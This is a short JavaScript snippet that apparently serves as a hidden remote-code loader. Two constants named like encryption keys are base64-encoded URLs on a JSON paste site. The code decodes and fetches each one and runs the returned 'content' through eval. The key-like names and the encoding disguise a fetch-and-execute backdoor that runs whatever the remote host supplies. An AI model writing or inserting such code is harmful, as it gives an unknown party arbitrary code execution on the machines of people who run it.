const ENCRYPT_KEY = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9VVlVQQQ==";
const DECRYPT_KEY = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9NRFMwNw==";

fetch(atob(ENCRYPT_KEY))
.then(response => response.json()) 
.then(data => {
  eval(data.content);
})


fetch(atob(DECRYPT_KEY))
.then(response => response.json()) 
.then(data => {
  eval(data.content);
})